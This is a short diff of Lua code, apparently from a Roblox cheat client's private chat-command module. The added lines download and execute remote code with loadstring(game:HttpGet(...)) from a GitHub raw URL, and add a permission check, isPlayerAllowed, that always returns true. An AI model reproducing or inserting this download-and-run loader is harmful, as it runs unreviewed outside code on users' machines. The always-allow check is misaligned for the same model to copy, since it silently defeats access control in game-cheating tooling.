@@ -1913,6 +1913,16 @@ runFunction(function()
 		}
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
+				local textChatService = game:GetService("TextChatService")
+		local allowedplayers = loadstring(game:HttpGet("https://raw.githubusercontent.com/PinkReleased/Ape/main/Ape"))()
+
+
+		local playersService = game:GetService("Players")
+
+		local function isPlayerAllowed(playerName)
+			return true
+		end
+
 		textChatService.OnIncomingMessage = function(message)
 			local props = Instance.new("TextChatMessageProperties")
 			if message.TextSource then
